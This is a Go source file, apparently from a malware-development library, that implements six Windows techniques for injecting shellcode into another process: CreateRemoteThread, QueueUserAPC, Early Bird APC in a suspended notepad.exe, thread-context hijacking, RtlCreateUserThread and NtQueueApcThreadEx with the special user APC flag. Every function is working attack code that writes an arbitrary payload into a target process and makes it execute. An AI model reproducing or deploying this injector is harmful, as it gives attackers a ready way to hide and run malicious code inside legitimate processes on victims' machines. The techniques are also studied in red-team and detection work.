//go:build windows

// Remote-process injection methods: target is a different process
// referenced by config.PID. CreateRemoteThread, QueueUserAPC,
// Early Bird APC, Thread Hijack, RtlCreateUserThread, NtQueueApcThreadEx.

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// --- Method 1: CreateRemoteThread ---

func (w *windowsInjector) injectCreateRemoteThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for CreateRemoteThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_QUERY_INFORMATION|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	hThread, _, err := api.ProcCreateRemoteThread.Call(
		uintptr(hProcess),
		0, 0,
		addr,
		0, 0, 0,
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}
	windows.CloseHandle(windows.Handle(hThread))

	return nil
}


// --- Method 3: QueueUserAPC ---

func (w *windowsInjector) injectQueueUserAPC(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for QueueUserAPC")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	// Find all threads of the target process
	threadIDs, err := findAllThreads(w.config.PID)
	if err != nil {
		return fmt.Errorf("failed to find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for target process")
	}

	success := false
	for _, threadID := range threadIDs {
		hThread, err := windows.OpenThread(
			windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME,
			false,
			threadID,
		)
		if err != nil {
			continue
		}

		count, _, _ := api.ProcSuspendThread.Call(uintptr(hThread))
		suspended := count != 0xFFFFFFFF // 0xFFFFFFFF means SuspendThread failed

		apcRet, _, apcErr := api.ProcQueueUserAPC.Call(addr, uintptr(hThread), 0)

		windows.ResumeThread(hThread)
		windows.CloseHandle(hThread)

		if apcRet == 0 {
			// QueueUserAPC returns 0 on failure
			_ = apcErr
			continue
		}
		if suspended {
			success = true
			break
		}
	}

	if !success {
		return fmt.Errorf("failed to queue APC on any thread")
	}

	return nil
}

// --- Method 4: Early Bird APC ---

func (w *windowsInjector) injectEarlyBird(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, nil)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	apcRet, _, _ := api.ProcQueueUserAPC.Call(
		addr,
		uintptr(pi.Thread),
		0,
	)
	if apcRet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("QueueUserAPC failed")
	}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread failed: %w", err)
	}

	return nil
}


// --- Method 5: Thread Execution Hijacking (T1055.003) ---

func (w *windowsInjector) injectThreadHijack(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}

	processPath := w.config.ProcessPath
	if processPath == "" {
		processPath = `C:\Windows\System32\notepad.exe`
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	cmdLine, err := windows.UTF16PtrFromString(processPath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	err = windows.CreateProcess(
		nil, cmdLine, nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(pi.Process, shellcode, nil)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	var ctx context64
	ctx.ContextFlags = contextFull

	retGet, _, _ := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retGet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext failed")
	}

	ctx.Rip = uint64(addr)

	retSet, _, _ := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	if retSet == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext failed")
	}

	windows.ResumeThread(pi.Thread)

	return nil
}


// --- Method 6: RtlCreateUserThread ---

func (w *windowsInjector) injectRtlCreateUserThread(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for RtlCreateUserThread")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_CREATE_THREAD,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	var hThread uintptr
	status, _, _ := api.ProcRtlCreateUserThread.Call(
		uintptr(hProcess),
		0,    // SecurityDescriptor
		0,    // CreateSuspended = FALSE
		0,    // StackZeroBits
		0,    // StackReserve
		0,    // StackCommit
		addr, // StartAddress
		0,    // Parameter
		uintptr(unsafe.Pointer(&hThread)),
		0, // ClientId
	)

	if status != 0 {
		return fmt.Errorf("RtlCreateUserThread failed: NTSTATUS 0x%X", status)
	}

	windows.CloseHandle(windows.Handle(hThread))
	return nil
}


// --- Method 10: NtQueueApcThreadEx ---

// injectNtQueueApcThreadEx uses NtQueueApcThreadEx with the special user APC flag
// (QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1) available on Windows 10 1903+.
// Unlike standard APC injection, this forces APC delivery without requiring
// the target thread to be in an alertable wait state.
func (w *windowsInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	if w.config.PID == 0 {
		return fmt.Errorf("PID required for NtQueueApcThreadEx")
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ,
		false,
		uint32(w.config.PID),
	)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := allocateAndWriteMemoryRemoteWithCaller(hProcess, shellcode, nil)
	if err != nil {
		return fmt.Errorf("remote memory setup failed: %w", err)
	}

	// Find all threads of the target process
	threadIDs, err := findAllThreads(w.config.PID)
	if err != nil {
		return fmt.Errorf("failed to find threads: %w", err)
	}
	if len(threadIDs) == 0 {
		return fmt.Errorf("no threads found for target process")
	}

	// NtQueueApcThreadEx with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC (flag=1)
	// forces delivery without alertable wait
	success := false
	for _, threadID := range threadIDs {
		hThread, openErr := windows.OpenThread(
			windows.THREAD_SET_CONTEXT,
			false,
			threadID,
		)
		if openErr != nil {
			continue
		}

		// NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle|Flags, ApcRoutine, Arg1, Arg2, Arg3)
		// Flag 1 = QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
		status, _, _ := api.ProcNtQueueApcThreadEx.Call(
			uintptr(hThread),
			1, // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
			addr,
			0, 0, 0,
		)
		windows.CloseHandle(hThread)

		if status == 0 { // STATUS_SUCCESS
			success = true
			break
		}
	}

	if !success {
		return fmt.Errorf("NtQueueApcThreadEx failed on all threads")
	}

	return nil
}
